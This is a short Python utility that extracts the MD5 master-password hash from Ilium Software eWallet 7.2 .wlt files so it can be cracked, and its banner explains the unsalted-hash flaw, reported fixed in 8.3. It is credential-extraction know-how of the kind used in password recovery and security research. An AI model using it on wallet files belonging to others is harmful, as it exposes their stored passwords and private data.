#!/usr/bin/env python

import sys
import os

def printBanner():
    print('\n\
################################################################################\n\
#                        eWallet <= 7.2 Hash Extrator           by: @skorov8   #\n\
################################################################################\n\
#                                                                              #\n\
# This tool helps to extract the master password hash from an Ilium Software   #\n\
# eWallet .wlt file. You can then throw it into your favourite password        #\n\
# cracker. (Tested on version 7.2. Verified fixed in version 8.3.)             #\n\
#                                                                              #\n\
# Background: Turns out, eWallet stored the Master Password hash inside a file #\n\
# as MD5. This is found at 0x125th byte with length of 16 bytes. One thing to  #\n\
# note is that the Master Password is encoded as UTF-16LE before hashing.      #\n\
#                                                                              #\n\
# Example: Password123! -> 3e649f4db026fb32e9938e1390d6a5e6                    #\n\
#                                                                              #\n\
################################################################################\n\
')

def getHash(ewallet_file):
    with open(ewallet_file, 'rb') as f:
        f.read(0x124) # Throw away first 0x124 bytes
        hash_array = f.read(16) # Get the hash
        if (len(hash_array) < 16):
            print('[X] Error: Invalid eWallet file.')
            return ""
        return ''.join('{:02x}'.format(x) for x in hash_array)


def getHelp():
    print('[-] Usage: python ewallet2hash.py <example.wlt>\n')

if __name__ == '__main__':
    printBanner()
    if len(sys.argv) < 2 or sys.argv[1] == '-h' or not os.path.exists(sys.argv[1]):
        getHelp()
        sys.exit()

    print(getHash(sys.argv[1]) + "\n")
